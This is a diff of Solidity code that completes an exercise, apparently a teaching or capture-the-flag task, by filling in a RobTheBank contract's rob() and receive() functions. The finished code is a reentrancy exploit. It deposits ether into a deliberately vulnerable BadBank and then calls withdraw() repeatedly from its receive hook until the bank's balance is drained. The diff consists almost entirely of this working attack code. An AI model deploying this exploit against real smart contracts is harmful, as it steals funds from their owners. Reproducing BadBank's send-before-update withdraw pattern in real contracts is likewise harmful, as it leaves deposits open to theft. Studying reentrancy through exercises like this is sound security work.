@@ -10,7 +10,7 @@ contract BadBank {
     function deposit() public payable {
         balances[msg.sender] += msg.value;
     }
-    
+
     function withdraw() public {
         uint256 balance = balances[msg.sender];
         Address.sendValue(payable(msg.sender), balance);
@@ -20,16 +20,21 @@ contract BadBank {
 
 contract RobTheBank {
     BadBank public bank;
+    uint256 private attackAmount;
 
     constructor(address _bank) {
         bank = BadBank(_bank);
     }
-    
+
     function rob() public payable {
-        // your code here
+        attackAmount = msg.value;
+        bank.deposit{value: attackAmount}();
+        bank.withdraw();
     }
 
     receive() external payable {
-        // your code here
+        if (address(bank).balance >= attackAmount) {
+            bank.withdraw();
+        }
     }
 }
